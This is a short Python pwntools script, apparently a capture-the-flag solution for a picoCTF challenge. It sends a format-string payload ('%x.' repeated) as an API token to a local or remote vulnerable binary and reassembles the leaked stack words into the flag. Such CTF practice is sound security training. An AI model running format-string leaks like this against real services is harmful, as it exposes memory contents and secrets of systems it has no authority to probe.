#!/usr/bin/env python3

from pwn import *
import argparse

if __name__ == "__main__":
	parser = argparse.ArgumentParser(prog="", description="")
	parser.add_argument("-l", "--local", action="store_true")
	parser.add_argument("-r", "--remote", action="store_true")
	args = parser.parse_args()


	if args.local:
		proc = process(["./vuln"])
	elif args.remote:
		proc = process(["nc", "mercury.picoctf.net", "27912"])
	else:
		print("[!] Use either --local or --remote")
		exit()

	proc.sendlineafter(b"2) View my portfolio", b"1")
	proc.sendlineafter(b"What is your API token?", b"%x." * 100)
	
	leaks = proc.recvlines(3)[-1].decode().split(".")
	flag = ""
	for leak in leaks:
		if len(leak) == 8:
			ba = bytearray.fromhex(leak)
			
			for r in reversed(ba):
				if r > 32 and r < 128:
					flag += chr(r)

	print(flag)